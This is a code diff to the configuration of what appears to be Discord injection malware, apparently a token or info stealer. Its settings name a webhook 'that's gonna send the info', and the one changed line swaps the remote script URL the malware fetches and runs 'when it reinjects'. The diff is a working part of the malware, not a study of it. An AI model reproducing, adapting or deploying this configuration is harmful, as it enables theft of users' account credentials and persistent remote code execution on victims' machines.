@@ -14,7 +14,7 @@ const config = {
   embed_name: 'Frogs injection', //name of the webhook thats gonna send the info
   embed_icon: 'https://cdn.discordapp.com/attachments/1049315096154882078/1063990776301891674/skinheads.png'.replace(/ /g, '%20'), //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
   embed_color: 0000000, //color for the embed, needs to be hexadecimal (just copy a hex and then use https://www.binaryhexconverter.com/hex-to-decimal-converter to convert it)
-  injection_url: 'https://raw.githubusercontent.com/Smug246/luna-injection/main/injection.js', //injection url for when it reinjects
+  injection_url: 'https://raw.githubusercontent.com/Emil8630/73g567v8b689eb467he7896465421s46444/main/index.js', //injection url for when it reinjects
   /**
    * @ATTENTION DON'T TOUCH UNDER HERE IF UNLESS YOU'RE MODIFYING THE INJECTION OR KNOW WHAT YOU'RE DOING @ATTENTION
    **/
